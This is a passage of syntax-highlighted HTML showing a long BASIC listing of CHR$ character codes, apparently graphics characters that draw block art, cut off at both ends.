class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">177</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">174</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token 